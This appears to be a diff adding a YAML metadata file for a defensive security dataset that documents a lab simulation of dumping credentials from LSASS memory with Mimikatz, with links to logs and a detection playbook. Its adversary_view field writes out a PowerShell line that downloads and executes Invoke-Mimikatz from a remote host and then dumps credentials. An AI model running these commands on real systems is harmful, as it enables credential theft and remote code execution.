@@ -1,0 +1,73 @@
+id: 190518-CredsAccess-LSASSReadProcessMemory
+title: Accessing Credentials via ReadProcessMemory API to LSASS
+description: This dataset represents adversaries reading credentials from the memory contents of lsass.exe via known Win32 APIs such as ReadProcessMemory. One popular tool performing this behavior is Mimikatz.
+references:
+
+collaborators:
+  - Roberto Rodriguez @Cyb3rWard0g
+creation_date: 2019/05/18
+modification_date: 2022/09/22
+platform:
+  - Windows
+type: atomic
+tags:
+  - LSASS Process Memory Read
+  - ProcessMemoryRead API
+
+attack_mappings:
+  - technique: T1003
+    sub-technique: "001"
+    tactics:
+      - TA0006
+
+datasets:
+  endpoint:
+    - log_source: Microsoft-Windows-Sysmon
+      size: 1.71 MB
+      link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/190518-CredsAccess-LSASSReadProcessMemory/WORKSTATION6_Windows_MicrosoftWindowsSysmonOperational.zip
+    - log_source: Microsoft-Windows-Security-Auditing
+      size: 1.71 MB
+      link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/190518-CredsAccess-LSASSReadProcessMemory/WORKSTATION6_Windows_Security.zip
+
+simulation:
+  environment: Blacksmith
+  tools:
+    - type: Manual
+      name: PowerShell
+      module: PowerShell
+      script: https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1
+  permissions_required:
+    - Administrator
+  adversary_view: |-
+    PS C:\Users\wardog.MSSENTINEL> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1')
+    PS C:\Users\wardog.MSSENTINEL> Invoke-Mimikatz -DumpCreds
+    Hostname: WORKSTATION6.mssentinel.local / S-1-5-21-1569727641-2518674866-3296776394
+
+      .#####.   mimikatz 2.2.0 (x64) #19041 Nov 20 2021 08:28:06
+    .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+    ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+    ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+    '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+      '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+    mimikatz(powershell) # sekurlsa::logonpasswords
+
+    Authentication Id : 0 ; 32472718 (00000000:01ef7e8e)
+    Session           : RemoteInteractive from 3
+    User Name         : wardog
+    Domain            : MSSENTINEL
+    Logon Server      : DC01
+    Logon Time        : 9/22/2022 10:29:31 AM
+    ..
+    ...
+    .....
+
+    mimikatz(powershell) # exit
+    Bye!
+
+    PS C:\Users\wardog.MSSENTINEL>
+
+detection:
+  - project: Threat Hunter Playbook
+    name: LSASS Memory Read Access
+    link: https://threathunterplaybook.com/hunts/windows/170105-LSASSMemoryReadAccess/notebook.html
